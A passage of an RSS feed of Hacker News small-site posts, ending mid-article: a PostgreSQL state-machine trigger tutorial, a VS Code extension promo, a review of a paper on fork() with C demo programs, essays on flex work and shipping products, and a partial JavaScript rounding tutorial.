     <span>WHERE</span> <span>state</span><span>=</span><span>_state</span> <span>AND</span> <span>event</span><span>=</span><span>_event</span> <span>AND</span> <span>version</span><span>=</span><span>_version</span><span>),</span>
    <span>'error'</span><span>::</span><span>order_state</span><span>);</span>
<span>$$</span><span>;</span>
<span>CREATE</span> <span>AGGREGATE</span> <span>order_events_fsm</span><span>(</span><span>order_event</span><span>,</span> <span>integer</span><span>)</span> <span>(</span>
  <span>SFUNC</span> <span>=</span> <span>order_events_transition</span><span>,</span>
  <span>STYPE</span> <span>=</span> <span>order_state</span><span>,</span>
  <span>INITCOND</span> <span>=</span> <span>'start'</span>
<span>);</span>
</code></pre></div></div>

<p>And finally we have to restrict some transitions according to version status. It is done in the <code>order_events_trigger</code>:</p>

<div><div><pre><code><span>CREATE</span> <span>FUNCTION</span> <span>order_events_trigger_func</span><span>()</span> <span>RETURNS</span> <span>trigger</span>
<span>LANGUAGE</span> <span>plpgsql</span> <span>AS</span> <span>$$</span>
<span>DECLARE</span>
  <span>next_state</span> <span>order_state</span><span>;</span>
  <span>transition_status</span> <span>order_fsm_version_status</span><span>;</span>
<span>BEGIN</span>
  <span>SELECT</span> <span>status</span> <span>FROM</span> <span>order_fsm_versions</span> <span>WHERE</span> <span>version</span><span>=</span><span>new</span><span>.</span><span>version</span> <span>INTO</span> <span>transition_status</span><span>;</span>
  <span>IF</span> <span>transition_status</span> <span>=</span> <span>'deprecated'</span><span>::</span><span>order_fsm_version_status</span> <span>THEN</span>
    <span>RAISE</span> <span>NOTICE</span> <span>'version % is deprecated'</span><span>,</span> <span>new</span><span>.</span><span>version</span><span>;</span>
  <span>END</span> <span>IF</span><span>;</span>
  <span>IF</span> <span>transition_status</span> <span>=</span> <span>'obsolete'</span><span>::</span><span>order_fsm_version_status</span> <span>THEN</span>
    <span>RAISE</span> <span>EXCEPTION</span> <span>'version % is obsolete'</span><span>,</span> <span>new</span><span>.</span><span>version</span><span>;</span>
  <span>END</span> <span>IF</span><span>;</span>

  <span>SELECT</span> <span>order_events_fsm</span><span>(</span><span>event</span><span>,</span> <span>version</span> <span>ORDER</span> <span>BY</span> <span>id</span><span>)</span>
  <span>FROM</span> <span>(</span>
    <span>SELECT</span> <span>id</span><span>,</span> <span>event</span><span>,</span> <span>version</span> <span>FROM</span> <span>order_events</span> <span>WHERE</span> <span>order_id</span> <span>=</span> <span>new</span><span>.</span><span>order_id</span>
    <span>UNION</span>
    <span>SELECT</span> <span>new</span><span>.</span><span>id</span><span>,</span> <span>new</span><span>.</span><span>event</span><span>,</span> <span>new</span><span>.</span><span>version</span>
  <span>)</span> <span>s</span>
  <span>INTO</span> <span>next_state</span><span>;</span>

  <span>IF</span> <span>next_state</span> <span>=</span> <span>'error'</span><span>::</span><span>order_state</span> <span>THEN</span>
    <span>RAISE</span> <span>EXCEPTION</span> <span>'invalid order event'</span><span>;</span>
  <span>END</span> <span>IF</span><span>;</span>

  <span>RETURN</span> <span>new</span><span>;</span>
<span>END</span>
<span>$$</span><span>;</span>
</code></pre></div></div>

<p>I can now introduce new versions of my FSM graph and deprecate previous one. When I insert row in <code>order_events</code> it is using by default the last <code>live</code> version of the graph.</p>

<div><div><pre><code><span>INSERT</span> <span>INTO</span> <span>order_fsm_versions</span> <span>(</span><span>version</span><span>,</span> <span>status</span><span>)</span> <span>VALUES</span> <span>(</span><span>2</span><span>,</span> <span>'live'</span><span>)</span> <span>RETURNING</span> <span>*</span><span>;</span>
<span>UPDATE</span> <span>order_fsm_versions</span> <span>SET</span> <span>status</span><span>=</span><span>'deprecated'</span> <span>WHERE</span> <span>version</span> <span>=</span> <span>1</span><span>;</span>

<span>INSERT</span> <span>INTO</span> <span>order_events_transitions</span> <span>(</span><span>state</span><span>,</span> <span>event</span><span>,</span> <span>next_state</span><span>,</span> <span>version</span><span>)</span> <span>VALUES</span>
  <span>(</span><span>'start'</span><span>,</span>             <span>'create'</span><span>,</span>  <span>'awaiting_approval'</span><span>,</span> <span>2</span><span>),</span>
  <span>(</span><span>'awaiting_approval'</span><span>,</span> <span>'approve'</span><span>,</span> <span>'awaiting_payment'</span><span>,</span>  <span>2</span><span>),</span>
  <span>(</span><span>'awaiting_payment'</span><span>,</span>  <span>'pay'</span><span>,</span>     <span>'awaiting_shipment'</span><span>,</span> <span>2</span><span>),</span>
<span>(...)</span>

<span>INSERT</span> <span>INTO</span> <span>order_events</span> <span>(</span><span>order_id</span><span>,</span> <span>event</span><span>,</span> <span>time</span><span>)</span> <span>VALUES</span>
  <span>(</span><span>'0d687d74-bab3-4c76-beed-0f55ec8a3af2'</span><span>,</span> <span>'create'</span><span>,</span>  <span>'2017-07-23 00:00:00'</span><span>),</span>
  <span>(</span><span>'0d687d74-bab3-4c76-beed-0f55ec8a3af2'</span><span>,</span> <span>'approve'</span><span>,</span> <span>'2017-07-23 00:00:00'</span><span>),</span>
  <span>(</span><span>'0d687d74-bab3-4c76-beed-0f55ec8a3af2'</span><span>,</span> <span>'pay'</span><span>,</span>     <span>'2017-07-23 12:00:00'</span><span>);</span>
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>I wrote <a href="https://raphael.medaer.me/resources/pgfsm.sql">a small SQL script which is testing all these features</a>. I hope it’s useful even if you can’t use it out of the box. Let me know if <a href="https://github.com/rmedaer/rmedaer.github.io/issues">you have feedback</a>.</p>

<p>Finally, keep in mind that it is still experimental. Consider it as a POC and not like something production-ready!</p>

<p>R.</p>

  </div></div>]]>
            </description>
            <link>https://raphael.medaer.me/2019/06/12/pgfsm.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246147</guid>
            <pubDate>Sat, 22 Aug 2020 18:31:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Select VS Code folders and workspaces by relevance]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24246047">thread link</a>) | @archyking
<br/>
August 22, 2020 | https://marquee.activecove.com/blog/6/ | <a href="https://web.archive.org/web/*/https://marquee.activecove.com/blog/6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>We love VS Code 🤟. We spent many hours heads-down in Microsoft's open source IDE to bring <a href="https://marquee.activecove.com/">Marquee</a> to you. Marquee is a powerful extension 💪, that, amongst many productivity boosters, lets you customize your VS Code homescreen.</p><p>VS Code turned 5 years old 🎉 this year. Just like with many open technologies, VS Code's available API docs are high quality but still sparse. Thankfully 🙏 the VS Code team publishes an <a href="https://github.com/microsoft/vscode-extension-samples">enormous mono-repo</a> with samples that showcase how different APIs work.</p><p><img alt="Marquee Blog" src="https://marquee.activecove.com/blog/6/headline.png"></p><p>During the average development week you quickly 📚 rack up 10s of VS Code windows browsing different sources, making progress on a variety of projects, and helping 💁 others reviewing their pull requests. Thanks to its ⚡ lightning fast nature, VS Code handles your many IDE windows, often running in parallel, just fine.</p><h2>🕵️ What's troublesome - losing track of the past</h2><p>If you opened all 46 API examples in VS Code, one folder each, in between working on your day and pet projects 🤞 good luck keeping track of your history. Find that one folder or workspace you 🤔 can't remember. This problem only get exacerbated as time goes by and you continue cycling through projects. This is why we have built <a href="https://marquee.activecove.com/">Marquee</a>'s Projects widget.</p><h2>🙈 When "open recent" fails you</h2><p>There are two kind of VS Code windows you need: Folders &amp; Workspaces. Folders you'd use for quick, likely non-permanent, tasks you want to accomplish whereas workspaces you'd use for more 🧐 permanent long-ranging projects. You'd likely fine-tune your workspaces' settings &amp; extensions to support your productivity. Marquee's Projects widget will keep a tally of all folders &amp; workspaces you've opened ever. To make it even quicker 🛸 to find your important projects quickly <a href="https://marquee.activecove.com/">Marquee</a> will sort your projects by relevance.</p><p><img alt="Marquee Blog" src="https://marquee.activecove.com/blog/6/projects.gif"></p><p>The relevance of your individual VS Code project is ranked by the number of 💡 todos &amp; notes associated per project (another neat feature Marquee provides). You will find that the projects 📈 most important to you will naturally generate the most notes &amp; todos. The widget also provides you with a handy text filter box to help finding that needle in the haystack.</p><h2>📫 What do you use to rank your projects importance?</h2><p>Let us know <a href="https://twitter.com/activecove">on twitter</a>! Please install <a href="https://marquee.activecove.com/">Marquee</a> and be sure to 🏄 give it a spin.</p></div></div></div>]]>
            </description>
            <link>https://marquee.activecove.com/blog/6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24246047</guid>
            <pubDate>Sat, 22 Aug 2020 18:18:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Paper: A Fork() in the Road]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245846">thread link</a>) | @gbrown_
<br/>
August 22, 2020 | https://dannas.name/fork | <a href="https://web.archive.org/web/*/https://dannas.name/fork">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<!-- excerpt start -->
<p>A review of Baumann et.als paper on limitations of the fork system call present in UNIX operating systems.
<!-- excerpt end --></p>

<p><a href="https://www.microsoft.com/en-us/research/uploads/prod/2019/04/fork-hotos19.pdf">Baumann, Andrew, et al. “A fork () in the road.” <em>Proceedings of the Workshop on Hot Topics in Operating Systems</em>. 2019</a>.</p>

<p>This is a paper that only affects a small number of people: those doing OS research and those that directly call <code>fork</code> from their programs. Still, I find it interesting since it points to limitations in the UNIX design. When I learned to program, UNIX was seen as the gold standard. I remember reading an LKML post from Linus Torvalds where he meant that OS development was about the refinement of existing ideas, not so much about inventing new concepts.  But people still do OS research, and the paper describes how having to support <code>fork</code> can be a burden.</p>

<p>The main criticism in the paper is about how <code>fork</code> affects many other parts of the system. It was originally a very simple idea: copy the address space of the parent and let the child redirect file descriptors, reduce permissions or, alter the namespace of the child.  But <code>fork</code> today impacts all other operating system abstractions with which it was once orthogonal. Below are some practical examples of things mentioned in the paper.</p>

<h2 id="buffered-io-and-fork">Buffered I/O and Fork</h2>

<p>What do you think this program will print?</p>

<div><div><pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main(void) {
    printf("Hello World! ");
    pid_t pid = fork();
    return 0;
}
</code></pre></div></div>

<p>It prints the output twice, <code>Hello World! Hello World!</code>, since the stdio buffers are flushed both in the parent and in the child. So  in this case <code>fork</code> doesn’t compose, since the calling code needs to explicitly flush I/O before calling <code>fork</code>.</p>

<h2 id="threads-and-fork">Threads and Fork</h2>

<p>This program starts a thread that locks a mutex for 1ms. It then forks a child which tries to lock the same mutex. What do you think it will print and why?</p>

<div><div><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/wait.h&gt;

static pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

static void* worker(void* arg) {
    pthread_detach(pthread_self());

    for (;;) {
      pthread_mutex_lock(&amp;thread_mutex);
      usleep(1000);
      pthread_mutex_unlock(&amp;thread_mutex);
    }
    return NULL;
}

int main() {
    pthread_t thread;
    pthread_create(&amp;thread, NULL, worker, 0);

    usleep(1000);
    pid_t pid = fork();

    if (pid == 0) {
        pthread_mutex_lock(&amp;thread_mutex);
        const char buf[] = "lock acquired\n";
        write(fileno(stderr), buf, strlen(buf));
        pthread_mutex_unlock(&amp;thread_mutex);
        exit(0);
    }

    wait3(NULL, WNOHANG, NULL);

    return 0;
}
</code></pre></div></div>

<p>On my system, the subprocess always deadlocks before printing the <code>lock acquired</code> message. A child created by <code>fork</code> has only a single thread (a copy of the calling thread). So there’s a good chance that the mutex will be in the locked state when the child starts executing. One common case where this happens is if a thread doing memory allocation and holding a heap lock, while <code>fork </code>is called.</p>

<h2 id="large-address-spaces-and-fork">Large address spaces and Fork</h2>

<p>How long do you think it takes to fork if the parent has 10K VMAs? Here’s a test program from Chromes <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=819228">Issue 819228: Consider using posix_spawn() on Linux</a>.</p>

<div><div><pre><code>/* Allocates several memory ranges and reports how long it takes to fork().
 *
 * clang slow_fork.c -o slow_fork &amp;&amp; ./slow_fork 100 10
 *
 * Almost no error checking anywhere.
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;

#define PAGE_SIZE 4096
#define SIZE 100 * PAGE_SIZE

void* mmap_anonymous(size_t size) {
  return mmap(NULL, size, PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
}

void** create_vmas(int count) {
  void** result = (void**) calloc(count, sizeof(void*));
  if (!result)
    return NULL;

  for (int i = 0; i &lt; count; i++) {
    result[i] = mmap_anonymous(SIZE);
    if (!result[i])
      return NULL;
  }
  return result;
}

void remove_vmas(void** arrays, int count) {
  for (int i = 0; i &lt; count; i++) {
    munmap(arrays[i], SIZE);
  }
  free(arrays);
}

void memset_all(void** arrays, int count) {
  for (int i = 0; i &lt; count; i++) {
    memset(arrays[i], 0, SIZE);
  }
}

struct timespec now() {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &amp;now);
  return now;
}

long interval_ns(struct timespec tick, struct timespec tock) {
  return (tock.tv_sec - tick.tv_sec) * 1000000000L
      + (tock.tv_nsec - tick.tv_nsec);
}

int main(int argc, char** argv) {
  int vmas, iterations;
  void** areas;
  struct timespec tick, tock;

  if (argc != 3) {
    printf("Usage: %s &lt;nb_vmas&gt; &lt;iterations&gt;\n", argv[0]);
    return 1;
  }

  vmas = atoi(argv[1]);
  iterations = atoi(argv[2]);

  for (int i = 0; i &lt; iterations; i++) {
    areas = create_vmas(vmas);
    if (!areas)
      return 1;

    memset_all(areas, vmas);

    tick = now();
    if (fork()) {
      // parent.
      tock = now();
      long ns = interval_ns(tick, tock);
      printf("%.2fus to fork().\n", (double) ns / 1e3);
    } else {
      _exit(0);
    }
    remove_vmas(areas, vmas);
  }

  return 0;
}
</code></pre></div></div>

<p>On my system, here are the run-times:</p>

<div><div><pre><code>$ ./fork 1 1
149.65us to fork().
$ ./fork 10 
89.63us to fork().
$ ./fork 100 1
576.18us to fork().
$ ./fork 1000 1
2661.38us to fork().
$ ./fork 10000 1
35420.67us to fork().
</code></pre></div></div>

<p>So 35ms to <code>fork</code> with 10K VMAs. If I replace the <code>fork</code> call with <code>vfork</code> it takes only 115us! The speed difference is because <code>fork</code> needs to copy the page table entries to the new address space.</p>

<p>To get around these limitations some systems mark memory-mapped regions as not to be forked. Others like Chrome creates  a zygote process that has as little memory allocated as possible to ensure fast process creation times.</p>

<h2 id="alternatives-to-fork">Alternatives to Fork</h2>

<p>You can use <code>vfork</code>  or <code>posix_spawn</code> instead. The <code>vfork</code> function creates a new process but does not copy the parent’s page tables. Instead, it starts the child in the same address space as its parent and starts it  before the parent. The only thing that can be done from there is calling èxec<code>. The </code>posix_spawn<code> API is much more complicated than just calling </code> <code>fork</code>, but as we’ve seen the simplicity comes with a great burden on modern systems.</p>


		
	</div></div>]]>
            </description>
            <link>https://dannas.name/fork</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245846</guid>
            <pubDate>Sat, 22 Aug 2020 17:54:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Flex Economy, Not the Gig or Passion Economy, Represents the Future of Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245521">thread link</a>) | @sahilz79
<br/>
August 22, 2020 | https://archimydes.dev/fourthact/blog/work-act-4-the-flex-economy | <a href="https://web.archive.org/web/*/https://archimydes.dev/fourthact/blog/work-act-4-the-flex-economy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As mentioned in our <a href="https://archimydes.dev/fourthact/blog/history-of-work-acts-1-2-and-3" target="_blank">previous post</a>, human economic productivity, or work, has been through three great Acts through the ages - the Hunter-Gatherer, the Agrarian, and the Industrial. We are now at very beginnings of what is the Fourth Great Act in this ever-evolving human economic drama - the Information Age. While Act 1 was largely about survival, Acts 2 and 3 were more about duty and responsibility. What will Act 4 of work be about? Can work finally be about passion and not simply survival or a paycheck? To answer this question we will have to examine what the Future of Work possibly holds.</p><p>In 2008, Kevin Kelly of Wired Magazine wrote a now-legendary post called "<a href="https://kk.org/thetechnium/1000-true-fans/" target="_blank">1000 True Fans</a>". The idea shared was as simple as it was revolutionary, in that to succeed in the Information Age, one doesn't need millions of dollars, or millions of fans - you could be fairly successful with 1000 true fans. The math behind it is simple, if you can convince 1000 people to pay $100 a year or $8.33/month, for something that can be produced for 0 or close to 0 marginal cost (think almost anything digital), then you generate an income of $100,000 a year. $100,000 a year is double the gross household income of Luxembourg - the country with the world's highest median income.</p><p>At the end of 2019, Li Jin of A16Z, wrote an updated and almost equally insightful piece - "<strong><a href="https://a16z.com/2020/02/06/100-true-fans/" target="_blank">1000 True Fans? Try 100</a></strong>". In this piece, Li, who is an investor and board member in companies such as <a href="https://substack.com/" target="_blank">Substack</a>, makes the argument that another way to get to $100,000 per year is to have 100 true-true fans, pay $1,000 a year, or $83.33 a month, for something that you can produce for 0 or close to 0 marginal cost. Li's argument for this is based on what creators are actually able to do on "Passion Economy" platforms such as Substack, Teachable etc. She doesn't necessarily argue that one monetization strategy is necessarily better or easier to achieve than the other, but that both are monetization strategies that should be given thought and consideration.</p><p>What both of these articles have in common though is the idea that we are moving into a new, creative-age of work, where creators will be rewarded for what they produce by niche audiences from around the world. A16Z very specifically refers to this type of monetization as the "Passion Economy", which stands in stark contrast to the "Gig Economy" which is largely transaction-based and does not reward outstanding performance or service. Below is a table from the above mentioned A16Z blog post differentiating the two:</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/fourthact_Sheet1_1_cf2658fb42.png" width="400"></center><p>From my perspective, I do not think the Future of Work will offer a binary choice, between the "Passion Economy" and the "Gig Economy". In particular, I think that while people do like the autonomy offered by being a part of the "Passion Economy", you practically need to be a solo entrepreneur to be successful in the Passion Economy. To be successful in the way Kevin or Li describes, can often involve a not insignificant, multi-year ramp-up period. Like with any other kind of entrepreneurship, solo entrepreneurship is hard and isn't for everyone - at least not yet.</p><p>So what alternatives are there to the Gig Economy and the Passion Economy? Well the most obvious still remains full-time employment at an organization. However as the Information Age has progressed, two things have happened:</p><ul><li><p>The size of companies, particularly in the digital space, has become much smaller. Where once a Kodak required close to 150,000 people working together, Instagram required 13 people working together at the time of its purchase by Facebook. Even today, with over half a billion users, the Instagram team at Facebook has only a little more than 5,000 full-time employees.</p></li><li><p>The churn in companies has increased manifold relative to the stability offered in most industrial age organizations. The average tenure of companies on the S&amp;P 500 which was approximately 33 years in 1964, will drop to just 12 years by 2027.</p></li></ul><p>We now live in a world that was described by Michael Malone, in his 2009 book <a href="https://www.amazon.com/Future-Arrived-Yesterday-Protean-Corporation/dp/0307406903" target="_blank">The Future Arrived Yesterday</a>, where the multi-national behemoths of the Industrial Age are being replaced by Protean Corporations of the Information age. Protean corporations - more commonly known as startups - are described as shapeshifting and are characterized by a relatively small core group of people coming together to build a company. This core group of people work together for say a period of 5-6 years building a company, let's call it a startup, pivots as needed (shapeshifting within the same org), scale it up to a certain point, exits, and moves on to their next (ad)venture (shapeshifting to a new org). The closest analogy to this form of an organization up to this point in time, albeit generally for even shorter periods of time, are film or show crews that make a movie or multi-year show together. What is more important for the purpose of this post though, is not the core group itself, but the much larger pool of flex talent (see image below), that the core group plugs into.</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/Protean_Corporation_v2_1_Aug2020_b54570c76b.png" width="250"></center><p>Are people that work in this much larger "flex" talent pool then the same as those that work in the "Gig Economy"? I will argue not, and for two critical reasons:</p><ul><li><p><strong>Context</strong>: Gig economy workers, do not require any context. Someone working for Uber, for example, needs to have zero context about the passenger that they are picking up and dropping off. The relationship is purely transactional. However, context is important when more sophisticated knowledge work like software development is involved. When onboarding a developer, for even say a single sprint, it is useful to bring on someone that has context on what your application is all about and who has some familiarity with the codebase.</p></li><li><p><strong>Specialization</strong>: Specialization is very important in the flex talent pool. Sticking to the Uber analogy, it isn't critical for an Uber driver to have Formula 1 driving skills to be employable. If I want to go from point A to point B driving skills matter very little. However, if I want a piece of code written that, for example, renders social graph features into my application, I am willing to pay a premium for someone that has experience with building similar features for other applications.</p></li></ul><p>Are these individuals then a part of the "Passion Economy"? Not quite. They might, in that what they work on day to day might very well be what they are most passionate about - however, it doesn't have to be. For example, not every developer I know is consumed by code. Some are, but most of them view their work as their profession, not necessarily their life's calling. They take up software development as a profession because it offers them a path forward to a more balanced and fulfilling life in general. More importantly, though, they are not like solo entrepreneurs. They are not for example constantly working on creating or distributing new content. They are not producing scalable output (for themselves at least) in the same way as someone on Substack or Teachable is - at least not yet.</p><p>From my perspective, I wouldn't term these resources as gig workers, passion workers, or as traditional full-time employees, but as "flex talent." Similarly, the companies that serve them (like <a href="https://www.archimydes.dev/" target="_blank">Archimydes</a>), I would call flex companies and the economy that constitutes this workforce as the "Flex Economy."</p><p>I also believe that particularly with the rise of remote work, asynchronous work processes will come to the forefront, enabling more efficient distribution of work both from the point of view of the company and talent. This will create a very large impetus towards the "Elex Economy" in which arguably more people will participate in than either the "Gig Economy" or the "Passion Economy". Below is an updated table that will characterize work in the "Flex Economy":</p><center><img src="https://strapi-contents.s3.us-east-2.amazonaws.com/fourthact_Sheet2_2_6840bbd059.png" width="400"></center><p>I expect flex work, particularly as it relates to software development, to replace full-time work as the dominant form of employment in the not too distant future. Flex talent will maintain anywhere from between a half a dozen to a dozen "projects" with different clients throughout the year. This will open up multiple revenue streams, with much greater autonomy than afforded in full-time work, and a larger take home. While this might not be the utopia of pure passion-based work, it is a huge step forward from the extremely fragile, industrial-age full-time work model. Additionally, it will embolden those that have hitherto held back from pursuing their passions because of the fear of losing a paycheck to do so with a safety net in place. As anyone that has pursued work in the Passion Economy will attest to even getting to 100 paying true-true fans paying a $1000 a year, can take several years!</p></div></div>]]>
            </description>
            <link>https://archimydes.dev/fourthact/blog/work-act-4-the-flex-economy</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245521</guid>
            <pubDate>Sat, 22 Aug 2020 17:07:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making and Shipping]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245307">thread link</a>) | @Hoasi
<br/>
August 22, 2020 | https://templates.supply/making-and-shipping/ | <a href="https://web.archive.org/web/*/https://templates.supply/making-and-shipping/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>
	<section class="page">
		<div>
			

<p>I am much happier making and shipping products than working on assignments for client projects. This realization comes as a surprise to me since I spent so much time honing skills to attract clients.</p>

<p>But there were always a least two issues with freelancing for me: the first ties to discretion. On one side, you have all these NDA preventing you from showing your best work, and thus you have little to show for, even after years of working for clients. The creative industry is an industry, and herein lies the problem with the creative economy. That leads us to the second issue I have with it: as a freelancer, my skills rarely get exploited as they should, in the proper sense of the word. One of the reasons for this is a failure on my part to communicate well about what I do. It is comparable to how agencies are the worst at communication when it comes to themselves. So maybe there is a reason along that line when it comes to present my portfolio of work. Or this is a simple curation mistake. There is always a lack of distance, a lack of objectivity when a designer presents their work. It is hard to pinpoint. The main reason, though, could be people’s inherent need for categorization. As a practice, design encompasses strategy, understanding, psychology, vision, decision-making, marketing, and aesthetics, to name a few. Similarly, illustration is not just one field, and there is no reason why I would want to limit my practice to a single style either. Concept art, editorial, cartoon, comics, historical illustration, animation, and visualizing are all equally challenging as they are different and attractive as a profession.</p>

<p>For me, the hardest part to explain to prospective clients is the difference between each assignment in my portfolio. In other words, diversity, something I inherently enjoy, leads to positioning and consistency troubles. In terms of branding, this is a generalist’s problem that can turn into a little bit of a nightmare: how can you showcase diametrically different skills in a way that doesn’t look like a weakness? And that might even be the wrong question to face the problem, mind you.</p>

<p>Now suppose that your skills lead to assignments in different fields, or that you need to partake in gigs that require a growing list of skills to be able to compete since you are not the best of the world in a unique, single skillset. In that scenario, you can take a partitioning approach: brand a for issue x, brand b for issue y, brand c for issue z, ok you get the idea. But that leads to another problem: waste. You will need to craft a portfolio for each of those sub-brands, think about a strategy, think about a presentation. Now, don’t get me wrong: honing your skills is never a waste of time. You will always learn useful things if you persevere. Yet it is a matter of priorities, even more so as a freelancer or a solo entrepreneur. You must decide where best to spend your finite energy resources. Add all the other issues that belong to freelance life, such as prospecting, invoicing, late payments, IP, and legal matters, all that cost a lot of time and energy. Whether you are a freelancer or a company makes no difference: you try to reduce efforts in some areas to be able to concentrate better on areas that matter more. Focus. Reduce waste. On the other hand, the opportunity cost may be even higher if you specialize, which takes years, only to find yourself unemployed once your unique skill is no longer under demand.</p>

<p>Shipping product(s) of your own spare you some of these problems, with the additional benefit of being compatible with doing client work. Another advantage is that developing a product that you use yourself puts you in the client’s shoes. It makes you consider problems from other angles. Any problem that you experience firsthand reinforces your ability to solve it on behalf of a client later. Companies, like <a href="https://basecamp.com/">Basecamp</a>, <a href="https://ia.net/">iA</a>, and <a href="https://gumroad.com/">Gumroad</a>, found their special calling once they started developing products on their own. Basecamp started as a web design agency (37signals), developing tools to ease their workflow led them to writing software that became their core business. iA, while still working for clients, developed the minimalist yet highly polished <a href="https://ia.net/writer">iA Writer</a>, initially to remedy their frustration at the lack of a simple text editor. Gumroad’s founder wanted a simple way to sell a product online. That did not exist, so he designed his own.</p>

<p>Creating unique tools for yourself, working on a product, or a range of products is beneficial, whether you keep working for clients later on or not. It is a good idea to start by designing something that you need and would use. Something simple, or even incomplete is good enough for a start. The <a href="https://gum.co/soon-jekyll">first Jekyll project</a> I released was super minimal, not even a complete theme, but it was useful to learn, and a first step. What is interesting is that each tool or product you build informs the next. You learn from trials and errors, and you never know, but there is a good chance that something useful to you will be to someone else.</p>







			
      <nav role="navigation">
  
  
  

      

		</nav></div>
	</section>
	

</div>


	</div></div>]]>
            </description>
            <link>https://templates.supply/making-and-shipping/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24245307</guid>
            <pubDate>Sat, 22 Aug 2020 16:42:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's talk about Math.ceil, Math.floor, and Math.round]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24245272">thread link</a>) | @nemo011
<br/>
August 22, 2020 | https://blog.nemotivity.xyz/lets-talk-about-mathceil-mathfloor-and-mathround-cke5vz93f013r9ds14gri50db | <a href="https://web.archive.org/web/*/https://blog.nemotivity.xyz/lets-talk-about-mathceil-mathfloor-and-mathround-cke5vz93f013r9ds14gri50db">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598114170225/ZYW09ru63.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><h2 id="introduction">Introduction</h2>
<p>We all have learned about rounding off numbers in our school. We usually increase the integer if its value is &gt;=.5 and decrease it, if it is &lt;= .4.</p>
<blockquote>
<p>1.5 ≈ 2</p>
<p>1.4 ≈ 1</p>
</blockquote>
<p>We all know JavaScript has a built-in object called Math, which has properties and methods for mathematical constants and functions. </p>
<p>We have three methods that are mostly used to round off a number in JS, i.e., <code>Math.ceil()</code>, <code>Math.floor()</code>, <code>Math.round()</code>. Let's explore them in this article.</p>
<p><img src="https://media.giphy.com/media/U5D3QY0QQWsR0nhwmg/giphy.gif" alt=""></p>
<h2 id="mathceil">🎳 Math.ceil</h2>
<p><code>Math.ceil</code> function in JavaScript is used to round of a number that is passed into it to its nearest integer in upward direction of rounding. What to I mean by upward direction? Towards the greater value. <code>Math.ceil()</code> takes only one parameter that is the value to be rounded.  So, if we have a value of 1.4, <code>Math.ceil()</code> will round off it to 2.</p>
<pre><code><span>console</span>.log(<span>Math</span>.ceil(<span>1.4</span>)); 

<span>console</span>.log(<span>Math</span>.ceil(<span>1.6</span>)); 

<span>console</span>.log(<span>Math</span>.round(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.round(<span>-1.6</span>));

</code></pre>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Ceiling_function.svg/800px-Ceiling_function.svg.png" alt=""><em>Photo from <a target="_blank" href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions#/media/File:Ceiling_function.svg">Wikipedia</a></em></p>
<h2 id="mathfloor">🎳 Math.floor()</h2>
<p>Where the <code>Math.ceil</code> method returns the smallest integer greater than or equal to the value we pass, <code>Math.floor</code> returns the largest or equal integer less than the given value. It also takes a single parameter. </p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Floor_function.svg/800px-Floor_function.svg.png" alt=""><em>Photo from <a target="_blank" href="https://en.wikipedia.org/wiki/Floor_and_ceiling_functions#/media/File:Floor_function.svg">Wikipedia</a></em></p>
<p>So, if we pass the same value 1.4 in <code>Math.floor</code>, we'll get 1 in return. Even if we pass 1.6, we'll also get 1.</p>
<pre><code><span>console</span>.log(<span>Math</span>.floor(<span>1.4</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>1.6</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>-1.4</span>));

<span>console</span>.log(<span>Math</span>.floor(<span>-1.6</span>));

</code></pre>
<h2 id="mathround">🎳 Math.round()</h2>
<p><code>Math.round()</code> rounds off the number depending on the fractional part of the number. So, if the fractional part is &gt;=.5, it'll return the smallest integer greater than the passed value and if the number is &lt;=.4 we'll get the largest integer smaller than the number we pass. </p>
